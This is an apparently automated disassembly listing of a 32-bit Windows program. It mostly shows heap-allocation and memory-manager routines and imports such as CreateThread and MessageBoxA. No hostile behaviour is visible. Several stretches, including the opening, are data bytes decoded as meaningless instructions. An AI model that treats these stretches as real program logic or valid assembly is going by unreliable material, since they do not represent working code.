sub_4010aa
call [ eax + r-xdata ]
add al 0x6
inc esp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] eax
insb
add [ gs : ebp + 0x10c00040 ] ecx
inc eax
add [ eax + ecx ] al
inc ebx
jne r-xdata
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
push ebx
jns r-xdata
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
jb r-xdata
add al 0xf8
je r-xdata
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
outsb
arpl [ ecx + 0x4 ] di
nop
rcl [ eax ] 0x1
inc eax
add [ edx ] cl
push es
push ebx
je r-xdata
inc esp
and al 0x4
clc
jmp sub_405ae4
insd
add [ eax ] al
adc [ ecx ] 0x40
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
add ah cl
xor [ eax ] eax
call 0x24405182
xor al [ eax ]
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x11 ] si
inc eax
add [ edi ] al
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
in al dx
adc [ eax ] al
or al 0x7
jmp sub_405b0c
jb r-xdata
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
inc eax
add [ ecx ] al
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 2 + 0x11 ] si
inc eax
add [ eax ] al
adc [ eax ] eax
pop es
add [ ecx ] al
add al 0x57
outsd
jb r-xdata
inc eax
add ah bh
adc [ eax ] al
or al 0xa
dec edi
insb
push esi
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_4013d4
mov esi eax
test esi esi
jne r-xdata
add [ eax ] al
add [ eax ] al
inc esi
std
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x12 ] bh
je r-xdata
push esi
popad
jb r-xdata
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ esi ] al
popad
outsb
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc eax
add [ ecx ] cl
adc al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
insd
add eax [ eax ]
sar bh 0x25
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add al 0x0
popad
jb r-xdata
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah dl
pop edx
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
les ebx [ edx + 0x40 ]
inc eax
add [ eax + eax ] cl
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x3bffbfa6 ] bh
pop edx
inc eax
rcl [ ecx ] 0x1
dec eax
add [ ebx - 0xbda0040 ] cl
adc [ eax ] ecx
mov eax eax
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
nop
adc al [ eax ]
adc [ ebx ] ecx
push esp
inc edx
outsd
jne r-xdata
and eax __import_lookup_table_0(kernel32:ExitProcess)
mov eax eax
inc ecx
jb r-xdata
and eax __import_lookup_table_1(user32:MessageBoxA)
mov eax eax
popad
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ esi ] al
push ebx
jns sub_401324
add [ eax ] al
add [ eax ] al
je r-xdata
dec eax
add [ ebx - 0x43da0040 ] cl
adc [ eax ] ecx
mov eax eax
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
insd
mov eax 0x4004012
or [ esp + eax * 2 + 0x61 ] edx
je sub_401324
push esp
imul ebp [ ebp + 0x65 ] 0xe025ff01
adc [ eax ] ecx
mov eax eax
jmp [ __import_lookup_table_0(kernel32:RaiseException) ]
sub_401450
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401410
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4014a8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401450
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4014f0
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4014d8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4014d8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4014a8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401560
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4014a8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4014d8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4015f4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4014a8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401420
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401428
xor eax eax
mov [ ebx ] eax
sub_401658
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401420
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401420
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4014a8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401428
xor eax eax
mov [ ebx ] eax
sub_4016d0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401428
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4014d8
mov [ rw-data ] 0x1
sub_401788
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401420
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40181c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401428
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_40189c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_4015f4
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_401788
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_4014f0
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4016d0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4014d8
jmp r-xdata
sub_40192c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401658
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_4014f0
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401658
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016d0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_4014f0
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_401788
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016d0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4014d8
jmp r-xdata
sub_401a50
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40181c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_4014f0
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4016d0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401560
jmp r-xdata
sub_401adc
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401b92
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401430
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4014a0
mov eax rw-data
call sub_4014a0
mov eax rw-data
call sub_4014a0
push 0xff8
push 0x0
call sub_401410
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401b99
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401440
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ba0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401c76
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401438
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401428
mov ebx [ ebx ]
mov eax rw-data
call sub_4014a0
mov eax rw-data
call sub_4014a0
mov eax rw-data
call sub_4014a0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401448
retn
push rw-data
call sub_401440
sub_401c80
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401ce4
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401d14
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401ee8
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401d68
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401d44
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401d90
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401c80
add ebx esi
mov [ rw-data ] 0x6
sub_401e00
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401c80
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401e38
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401ce4
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401a50
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401a50
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401d14
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401560
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401d68
sub_401ee8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401e38
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401f70
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401d44
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401fbc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401f70
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_4014f0
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401d90
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401e00
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401d14
sub [ edi + 0x4 ] 0x4
sub_402048
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_40189c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401fbc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_402074
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40192c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401fbc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_4020a8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_4020d4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401c80
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401ee8
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_402048
test al al
jne r-xdata
mov eax esi
call sub_4020a8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4021c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401adc
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402344
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401438
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_4020d4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
